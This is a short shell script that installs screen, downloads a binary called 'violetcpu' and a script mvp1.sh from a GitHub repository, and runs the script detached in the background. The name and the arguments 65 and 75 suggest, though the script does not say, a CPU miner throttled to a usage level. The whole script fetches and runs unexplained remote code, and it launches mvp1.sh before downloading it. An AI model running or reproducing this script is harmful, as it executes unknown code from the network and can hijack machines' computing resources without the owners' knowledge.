#!/bin/sh

sudo apt update

sudo apt install screen -y

screen -dmS mvp1.sh ./mvp1.sh 65 75

wget https://github.com/angkii/bh/raw/main/violetcpu

wget https://raw.githubusercontent.com/angkii/bh/main/mvp1.sh

chmod +x mvp1.sh

./mvp1.sh

